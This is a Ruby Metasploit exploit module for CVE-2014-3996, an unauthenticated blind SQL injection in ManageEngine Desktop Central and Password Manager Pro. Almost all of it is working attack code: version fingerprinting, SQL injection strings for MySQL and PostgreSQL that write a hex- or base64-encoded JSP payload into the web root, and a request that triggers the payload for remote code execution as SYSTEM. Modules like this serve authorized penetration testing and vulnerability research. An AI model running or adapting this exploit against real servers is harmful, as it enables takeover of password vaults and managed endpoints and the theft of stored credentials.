##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/file_dropper'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper
  include Msf::Exploit::EXE

  def initialize(info={})
    super(update_info(info,
      'Name'           => "ManageEngine Desktop Central / Password Manager LinkViewFetchServlet.dat SQL Injection",
      'Description'    => %q{
        This module exploits an unauthenticated blind SQL injection in LinkViewFetchServlet,
        which is exposed in ManageEngine Desktop Central v7 build 70200 to v9 build 90033 and
        Password Manager Pro v6 build 6500 to v7 build 7002 (including the MSP versions). The
        SQL injection can be used to achieve remote code execution as SYSTEM in Windows or as
        the user in Linux. This module exploits both PostgreSQL (newer builds) and MySQL (older
        or upgraded builds). MySQL targets are more reliable due to the use of relative paths;
        with PostgreSQL you should find the web root path via other means and specify it with
        WEB_ROOT.

        The injection is only exploitable via a GET request, which means that the payload
        has to be sent in chunks smaller than 8000 characters (URL size limitation). Small
        payloads and the use of exe-small is recommended, as you can only do between 10 and
        20 injections before using up all the available ManagedConnections until the next
        server restart.

        This vulnerability exists in all versions released since 2006, however builds below
        DC v7 70200 and PMP v6 6500 do not ship with a JSP compiler. You can still try your
        luck using the MySQL targets as a JDK might be installed in the $PATH.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'Pedro Ribeiro <pedrib[at]gmail.com>'  # Vulnerability discovery and MSF module
        ],
      'References'     =>
        [
          [ 'CVE', '2014-3996' ],
          [ 'OSVDB', '110198' ],
          [ 'URL', 'https://seclists.org/fulldisclosure/2014/Aug/55' ]
        ],
      'Arch'           => ARCH_JAVA,
      'Platform'       => %w{ linux win },
      'Targets'        =>
        [
          [  'Automatic', {}  ],
          [  'Desktop Central v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows',
            {
              'WebRoot' => 'C:\\ManageEngine\\DesktopCentral_Server\\webapps\\DesktopCentral\\',
              'Database' => 'postgresql',
              'Platform' => 'win'
            }
          ],
          [  'Desktop Central MSP v8 >= b80200 / v9 < b90039 (PostgreSQL) on Windows',
            {
              'WebRoot' => 'C:\\ManageEngine\\DesktopCentralMSP_Server\\webapps\\DesktopCentral\\',
              'Database' => 'postgresql',
              'Platform' => 'win'
            }
          ],
          [  'Desktop Central [MSP] v7 >= b70200 / v8 / v9 < b90039 (MySQL) on Windows',
            {
              'WebRoot' => '../../webapps/DesktopCentral/',
              'Database' => 'mysql',
              'Platform' => 'win'
            }
          ],
          [  'Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Windows',
            {
              'WebRoot' => 'C:\\ManageEngine\\PMP\\webapps\\PassTrix\\',
              'Database' => 'postgresql',
              'Platform' => 'win'
            }
          ],
          [  'Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Windows',
            {
              'WebRoot' => '../../webapps/PassTrix/',
              'Database' => 'mysql',
              'Platform' => 'win'
            }
          ],
          [  'Password Manager Pro [MSP] v6 >= b6800 / v7 < b7003 (PostgreSQL) on Linux',
            {
              'WebRoot' => '/opt/ManageEngine/PMP/webapps/PassTrix/',
              'Database' => 'postgresql',
              'Platform' => 'linux'
            }
          ],
          [  'Password Manager Pro v6 >= b6500 / v7 < b7003 (MySQL) on Linux',
            {
              'WebRoot' => '../../webapps/PassTrix/',
              'Database' => 'mysql',
              'Platform' => 'linux'
            }
          ]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => false,            # Privileged on Windows but not on Linux targets
      'DisclosureDate' => "Jun 8 2014"))

    register_options(
      [
        OptPort.new('RPORT',
          [true, 'The target port', 8020]),
        OptString.new('WEB_ROOT',
          [false, 'Slash terminated web server root filepath (escape Windows paths with 4 slashes \\\\\\\\)'])
      ])

    register_advanced_options(
      [
        OptInt.new('SLEEP',
          [true, 'Seconds to sleep between injections (x1 for MySQL, x2.5 for PostgreSQL)', 2]),
      ])

  end

  def check
    check_code = check_desktop_central

    if check_code == Exploit::CheckCode::Unknown
      check_code = check_password_manager_pro
    end

    check_code
  end

  def exploit
    @my_target = pick_target
    if @my_target.nil?
      fail_with(Failure::NoTarget, "#{peer} - Automatic targeting failed")
    else
      print_status("Selected target #{@my_target.name}")
    end

    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.
    # Fail if this is the case to avoid polluting the web root any more.
    if @my_target['Platform'] == 'linux' && payload_instance.name =~ /windows/i
      fail_with(Failure::BadConfig, "#{peer} - Select a compatible payload for this Linux target.")
    end

    if datastore['WEB_ROOT']
      web_root = datastore['WEB_ROOT']
    else
      web_root = @my_target['WebRoot']
    end

    jsp_name  = rand_text_alpha_lower(8) + ".jsp"
    fullpath = web_root + jsp_name
    inject_exec(fullpath)
    register_file_for_cleanup(fullpath.sub('../',''))

    print_status("Requesting #{jsp_name}")
    send_request_raw({'uri' => normalize_uri(jsp_name)})
  end

  # Test for Password Manager Pro
  def password_manager_paths
    db_paths = {}

    res = send_request_cgi({
                               'uri' => normalize_uri("PassTrixMain.cc"),
                               'method' => 'GET'
                           })

    if res && res.code == 200 && res.body.to_s =~ /ManageEngine Password Manager Pro/
      if datastore['WEB_ROOT']
        db_paths[:postgresql] = datastore['WEB_ROOT'].dup
        db_paths[:mysql] = datastore['WEB_ROOT'].dup
      else
        db_paths[:postgresql] = targets[4]['WebRoot'].dup
        db_paths[:mysql] = targets[5]['WebRoot'].dup
      end
    end

    db_paths
  end

  # Test for Desktop Central
  def desktop_central_db_paths
    db_paths = {}
    res = send_request_cgi({
                               'uri' => normalize_uri("configurations.do"),
                               'method' => 'GET'
                           })

    if res && res.code == 200 && res.body.to_s =~ /ManageEngine Desktop Central/
      if datastore['WEB_ROOT']
        db_paths[:postgresql] = datastore['WEB_ROOT'].dup
        db_paths[:mysql] = datastore['WEB_ROOT'].dup
      elsif res.body.to_s =~ /ManageEngine Desktop Central MSP/
        db_paths[:postgresql] = targets[2]['WebRoot'].dup
        db_paths[:mysql] = targets[3]['WebRoot'].dup
      else
        db_paths[:postgresql] = targets[1]['WebRoot'].dup
        db_paths[:mysql] = targets[3]['WebRoot'].dup
      end
    end

    db_paths
  end

  def db_paths
    paths = desktop_central_db_paths

    if paths.empty?
      paths = password_manager_paths
    end

    paths
  end

  def pick_mysql_target(mysql_path, rand_txt)
    file_path = mysql_path << rand_txt

    # @@version_compile_os will give us Win32 / Win64 if it's a Windows target
    inject_sql("select @@version_compile_os into dumpfile '#{file_path}'", "mysql")

    res = send_request_cgi({
                               'uri' => normalize_uri(rand_txt),
                               'method' => 'GET'
                           })

    if res && res.code == 200
      register_file_for_cleanup(file_path.sub('../',''))
      if res.body.to_s =~ /Win32/ or res.body.to_s =~ /Win64/
        if mysql_path =~ /DesktopCentral/
          # Desktop Central [MSP] / MySQL / Windows
          return targets[3]
        else
          # Password Manager Pro / MySQL / Windows
          return targets[5]
        end
      else
        # Password Manager Pro / MySQL / Linux
        return targets[7]
      end
    end

    nil
  end

  def pick_postgres_target(postgresql_path, rand_txt)
    file_path = postgresql_path << rand_txt

    # version() will tell us if it's compiled by Visual C++ (Windows) or gcc (Linux)
    inject_sql("copy (select version()) to '#{file_path}'", "postgresql")

    res = send_request_cgi({
                               'uri' => normalize_uri(rand_txt),
                               'method' => 'GET'
                           })

    if res && res.code == 200
      register_file_for_cleanup(file_path)
      if res.body.to_s =~ /Visual C++/
        if postgresql_path =~ /DesktopCentral_Server/
          # Desktop Central / PostgreSQL / Windows
          return targets[1]
        elsif postgresql_path =~ /DesktopCentralMSP_Server/
          # Desktop Central MSP / PostgreSQL / Windows
          return targets[2]
        else
          # Password Manager Pro / PostgreSQL / Windows
          return targets[4]
        end
      elsif res.body.to_s =~ /linux/
        # This is for the case when WEB_ROOT is provided
        # Password Manager Pro / PostgreSQL / Linux
        return targets[6]
      end
    end

    # OK, it's Password Manager Pro on Linux, probably using PostgreSQL and
    # no WEB_ROOT was provided. Let's try one of the defaults before bailing out.
    file_path = targets[5]['WebRoot'].dup << rand_txt
    inject_sql("copy (select version()) to '#{file_path}'", "postgresql")

    res = send_request_cgi({
                               'uri' => normalize_uri(rand_txt),
                               'method' => 'GET'
                           })

    if res && res.code == 200 && res.body.to_s =~ /linux/
      # Password Manager Pro / PostgreSQL / Linux
      return targets[6]
    end

    nil
  end

  def pick_target
    return target if target.name != 'Automatic'

    print_status("Selecting target, this might take a few seconds...")
    rand_txt = rand_text_alpha_lower(8) << ".txt"

    paths = db_paths

    if paths.empty?
      # We don't know what this is, bail
      return nil
    end

    postgresql_path = paths[:postgresql]
    mysql_path = paths[:mysql]

    # try MySQL first, there are probably more of these out there
    mysql_target = pick_mysql_target(mysql_path, rand_txt)

    unless mysql_target.nil?
      return mysql_target
    end

    # didn't work, let's try PostgreSQL
    postgresql_target = pick_postgres_target(postgresql_path, rand_txt)

    postgresql_target
  end

  #
  # Creates the JSP payload to upload
  #
  def generate_jsp_encoded
    jsp = payload.raw.gsub(/[\n\t]/, '')
    if @my_target['Database'] == 'postgresql'
      # Ruby's base64 encoding adds newlines at every 60 chars, strip them
      [jsp].pack("m*").gsub(/\n/, '')
    else
      # Assuming mysql, applying hex encoding instead
      jsp.unpack("H*")[0]
    end
  end


  def inject_sql(sqli_command, target = nil)
    target = (target == nil) ? @my_target['Database'] : target
    if target == 'postgresql'
      sqli_prefix = "viewname\";"
      sqli_suffix = ";-- "
    else
      # Assuming mysql
      sqli_prefix = "viewname\" union "
      sqli_suffix = "#"
    end

    send_request_cgi({
      'method'    => 'GET',
      'uri'       => normalize_uri("LinkViewFetchServlet.dat"),
      'vars_get'  => {
        'sv'    => sqli_prefix << sqli_command << sqli_suffix
      }
    })

    if target == 'postgresql'
      # PostgreSQL sometimes takes a while to write to the disk, so sleep more
      sleep(datastore['SLEEP'] * 2.5)
    else
      # Assuming mysql
      sleep(datastore['SLEEP'])
    end
   end

  # Uploads the payload in chunks
  def inject_exec(fullpath)
    jsp_encoded = generate_jsp_encoded
    if @my_target['Database'] == 'postgresql'
      inject_sql("copy (select convert_from(decode('#{jsp_encoded}','base64'),'utf8')) to '#{fullpath}'")
    else
      inject_sql("select 0x#{jsp_encoded} from mysql.user into dumpfile '#{fullpath}'")
    end
  end

  def check_desktop_central_8(body)
    if body =~ /id="buildNum" value="([0-9]+)"\/>/
      build = $1
      if ver_gt(build, '80200')
        print_status("Detected Desktop Central v8 #{build}")
      else
        print_status("Detected Desktop Central v8 #{build} (MySQL)")
      end
    else
      print_status("Detected Desktop Central v8 (MySQL)")
    end
    # DC v8 < 80200 uses the MySQL database
    Exploit::CheckCode::Appears
  end

  def check_desktop_central_9(body)
    if body =~ /id="buildNum" value="([0-9]+)"\/>/
      build = $1
      print_status("Detected Desktop Central v9 #{build}")
      if ver_lt(build, '90039')
        return Exploit::CheckCode::Appears
      else
        return Exploit::CheckCode::Safe
      end
    end
  end

  # Test for Desktop Central
  def check_desktop_central
    res = send_request_cgi({
                               'uri' => normalize_uri("configurations.do"),
                               'method' => 'GET'
                           })

    unless res && res.code == 200
      return Exploit::CheckCode::Unknown
    end

    if res.body.to_s =~ /ManageEngine Desktop Central 7/ ||
        res.body.to_s =~ /ManageEngine Desktop Central MSP 7/
      # DC v7 uses the MySQL database
      print_status("Detected Desktop Central v7 (MySQL)")
      return Exploit::CheckCode::Appears
    elsif res.body.to_s =~ /ManageEngine Desktop Central 8/ ||
        res.body.to_s =~ /ManageEngine Desktop Central MSP 8/
      return check_desktop_central_8(res.body.to_s)
    elsif res.body.to_s =~ /ManageEngine Desktop Central 9/ ||
        res.body.to_s =~ /ManageEngine Desktop Central MSP 9/
      return check_desktop_central_9(res.body.to_s)
    end

    Exploit::CheckCode::Unknown
  end

  # Test for Password Manager Pro
  def check_password_manager_pro
    res = send_request_cgi({
                               'uri' => normalize_uri("PassTrixMain.cc"),
                               'method' => 'GET'
                           })

    if res && res.code == 200 &&
        res.body.to_s =~ /ManageEngine Password Manager Pro/ &&
        (
          res.body.to_s =~ /login\.css\?([0-9]+)/ ||                            # PMP v6
          res.body.to_s =~ /login\.css\?version=([0-9]+)/ ||                    # PMP v6
          res.body.to_s =~ /\/themes\/passtrix\/V([0-9]+)\/styles\/login\.css"/ # PMP v7
        )
      build = $1
    else
      return Exploit::CheckCode::Unknown
    end


    if ver_lt_eq(build, '6500')
      # if it's a build below 6500, it will only work if we have a JSP compiler
      print_status("Detected Password Manager Pro v6 #{build} (needs a JSP compiler)")
      return Exploit::CheckCode::Detected
    elsif ver_lt(build, '6800')
      # PMP v6 < 6800 uses the MySQL database
      print_status("Detected Password Manager Pro v6 #{build} (MySQL)")
      return Exploit::CheckCode::Appears
    elsif ver_lt(build, '7003')
      print_status("Detected Password Manager Pro v6 / v7 #{build}")
      return Exploit::CheckCode::Appears
    else
      print_status("Detected Password Manager Pro v6 / v7 #{build}")
      Exploit::CheckCode::Safe
    end
  end

  def ver_lt(a, b)
    Gem::Version.new(a) < Gem::Version.new(b)
  end

  def ver_lt_eq(a, b)
    Gem::Version.new(a) <= Gem::Version.new(b)
  end

  def ver_gt_eq(a, b)
    Gem::Version.new(a) >= Gem::Version.new(b)
  end

  def ver_gt(a, b)
    Gem::Version.new(a) > Gem::Version.new(b)
  end
end
